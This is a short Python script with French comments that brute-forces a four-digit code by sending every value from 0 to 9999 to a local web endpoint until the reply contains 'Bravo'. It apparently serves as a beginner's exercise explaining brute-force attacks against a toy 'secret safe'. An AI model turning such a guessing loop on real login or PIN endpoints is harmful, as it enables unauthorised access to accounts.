import requests

# -----------------------------------------------
# Bruteforce du coffre secret
# -----------------------------------------------
# Ce programme essaie tous les codes possibles
# de 0 à 9999 jusqu'à trouver le bon.
#
# C'est ce qu'on appelle une attaque "brute force" :
# on essaie tout, un par un, sans réfléchir.
# -----------------------------------------------

URL = "http://127.0.0.1:5000/check"

# On essaie tous les codes de 0 à 9999
for code in range(10000):

    # On envoie le code au site web
    reponse = requests.post(URL, data={"code": code})

    # On affiche le code qu'on est en train de tester
    print(f"Essai : {code}")

    # Si le site nous dit qu'on a gagné, on s'arrête
    if "Bravo" in reponse.text:
        print()
        print(f">>> Code trouvé : {code} <<<")
        break
